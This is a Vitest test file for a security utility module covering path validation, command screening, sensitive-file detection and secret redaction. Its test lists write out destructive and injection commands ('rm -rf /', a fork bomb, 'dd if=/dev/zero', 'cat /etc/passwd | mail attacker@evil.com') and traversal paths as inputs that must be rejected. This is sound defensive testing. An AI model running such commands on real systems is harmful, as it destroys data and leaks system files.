import { describe, it, expect } from 'vitest';
import {
  validatePath,
  validateCommand,
  isSensitiveFile,
  sanitizePath,
  filterSensitiveInfo
} from '../lib/utils/security.js';

describe('Security Module', () => {
  describe('validatePath', () => {
    it('should validate relative paths', () => {
      expect(validatePath('test.txt')).toBeDefined();
      expect(validatePath('dir/test.txt')).toBeDefined();
      expect(validatePath('./test.txt')).toBeDefined();
    });

    it('should validate absolute paths', () => {
      expect(validatePath('/home/user/test.txt')).toBeDefined();
    });

    it('should reject paths with .. (path traversal)', () => {
      expect(() => validatePath('../etc/passwd')).toThrow();
      expect(() => validatePath('../../etc/passwd')).toThrow();
      expect(() => validatePath('dir/../../etc/passwd')).toThrow();
    });

    it('should reject paths with null bytes', () => {
      expect(() => validatePath('test\x00.txt')).toThrow();
    });

    it('should resolve relative to current directory', () => {
      const result = validatePath('test.txt');
      expect(result).toContain('test.txt');
    });
  });

  describe('validateCommand', () => {
    it('should validate safe commands', () => {
      const safeCommands = [
        'ls -la',
        'cat file.txt',
        'grep "pattern" file.txt',
        'git status',
        'npm install',
        'node script.js',
        'python script.py'
      ];

      safeCommands.forEach(cmd => {
        const result = validateCommand(cmd);
        expect(result.safe).toBe(true);
      });
    });

    it('should detect dangerous commands', () => {
      const dangerousCommands = [
        'rm -rf /',
        'rm -rf /home',
        'rm -rf /*',
        'rm -rf ~',
        'rm -rf /etc',
        'rm -rf /var',
        'mkfs',
        'dd if=/dev/zero',
        ':(){ :|:& };:',
        'chmod 777 /',
        'chmod -R 777 /'
      ];

      dangerousCommands.forEach(cmd => {
        const result = validateCommand(cmd);
        expect(result.safe).toBe(false);
        expect(result.reason).toBeDefined();
      });
    });

    it('should detect command injection attempts', () => {
      const injections = [
        'ls; rm -rf /',
        'cat /etc/passwd | mail attacker@evil.com',
        'ls && rm -rf /',
        'ls || rm -rf /'
      ];

      injections.forEach(cmd => {
        const result = validateCommand(cmd);
        expect(result.safe).toBe(false);
      });
    });

    it('should handle commands with pipes', () => {
      const result = validateCommand('cat file.txt | grep pattern');
      expect(result.safe).toBe(true);
    });

    it('should handle commands with redirects', () => {
      const result = validateCommand('ls > output.txt');
      expect(result.safe).toBe(true);
    });
  });

  describe('isSensitiveFile', () => {
    it('should detect .env files', () => {
      expect(isSensitiveFile('.env')).toBe(true);
      expect(isSensitiveFile('config/.env')).toBe(true);
    });

    it('should detect .key files', () => {
      expect(isSensitiveFile('secret.key')).toBe(true);
      expect(isSensitiveFile('private.key')).toBe(true);
    });

    it('should detect .pem files', () => {
      expect(isSensitiveFile('cert.pem')).toBe(true);
    });

    it('should detect credential files', () => {
      expect(isSensitiveFile('credentials.json')).toBe(true);
      expect(isSensitiveFile('service-account.json')).toBe(true);
    });

    it('should allow non-sensitive files', () => {
      expect(isSensitiveFile('readme.md')).toBe(false);
      expect(isSensitiveFile('package.json')).toBe(false);
      expect(isSensitiveFile('index.js')).toBe(false);
    });

    it('should detect sensitive patterns', () => {
      expect(isSensitiveFile('config/secret.txt')).toBe(true);
      expect(isSensitiveFile('api-key.txt')).toBe(true);
      expect(isSensitiveFile('password.txt')).toBe(true);
    });
  });

  describe('sanitizePath', () => {
    it('should remove trailing slashes', () => {
      expect(sanitizePath('/home/user/')).toBe('/home/user');
      expect(sanitizePath('/home/user//')).toBe('/home/user');
    });

    it('should resolve . and ..', () => {
      const result = sanitizePath('./dir/../file.txt');
      expect(result).not.toContain('..');
    });

    it('should normalize path separators', () => {
      expect(sanitizePath('dir//file.txt')).toBe('dir/file.txt');
    });

    it('should handle absolute paths', () => {
      expect(sanitizePath('/home/user')).toBe('/home/user');
    });

    it('should handle relative paths', () => {
      expect(sanitizePath('dir/file.txt')).toBe('dir/file.txt');
    });
  });

  describe('filterSensitiveInfo', () => {
    it('should filter API keys', () => {
      const text = 'My API key is sk-abcdefghijklmnopqrstuvwxyz1234567890';
      const filtered = filterSensitiveInfo(text);
      expect(filtered).not.toContain('sk-abcdefghijklmnopqrstuvwxyz1234567890');
    });

    it('should filter passwords', () => {
      const text = 'password: secret123';
      const filtered = filterSensitiveInfo(text);
      expect(filtered).toContain('password:');
      expect(filtered).not.toContain('secret123');
    });

    it('should filter tokens', () => {
      const text = 'token: ghp_1234567890abcdefghijklmnopqrstuvwxyz';
      const filtered = filterSensitiveInfo(text);
      expect(filtered).not.toContain('ghp_1234567890abcdefghijklmnopqrstuvwxyz');
    });

    it('should filter AWS access keys', () => {
      const text = 'Access Key: AKIAIOSFODNN7EXAMPLE';
      const filtered = filterSensitiveInfo(text);
      expect(filtered).not.toContain('AKIAIOSFODNN7EXAMPLE');
    });

    it('should preserve non-sensitive text', () => {
      const text = 'Hello world, this is normal text.';
      const filtered = filterSensitiveInfo(text);
      expect(filtered).toBe(text);
    });

    it('should handle multiple sensitive patterns', () => {
      const text = 'API key: sk-xxx, password: secret123, token: ghp_yyy';
      const filtered = filterSensitiveInfo(text);
      expect(filtered).not.toContain('sk-xxx');
      expect(filtered).not.toContain('secret123');
      expect(filtered).not.toContain('ghp_yyy');
    });

    it('should mask with placeholder', () => {
      const text = 'API key: sk-xxx';
      const filtered = filterSensitiveInfo(text);
      expect(filtered).toContain('[REDACTED]') || expect(filtered).toContain('***');
    });
  });

  describe('Edge Cases', () => {
    it('should handle empty strings in validatePath', () => {
      expect(() => validatePath('')).toThrow();
    });

    it('should handle null in validatePath', () => {
      expect(() => validatePath(null)).toThrow();
    });

    it('should handle empty command in validateCommand', () => {
      const result = validateCommand('');
      expect(result).toBeDefined();
    });

    it('should handle null in isSensitiveFile', () => {
      expect(isSensitiveFile(null)).toBe(false);
    });

    it('should handle empty string in filterSensitiveInfo', () => {
      const result = filterSensitiveInfo('');
      expect(result).toBe('');
    });

    it('should handle null in filterSensitiveInfo', () => {
      const result = filterSensitiveInfo(null);
      expect(result).toBeNull();
    });
  });
});
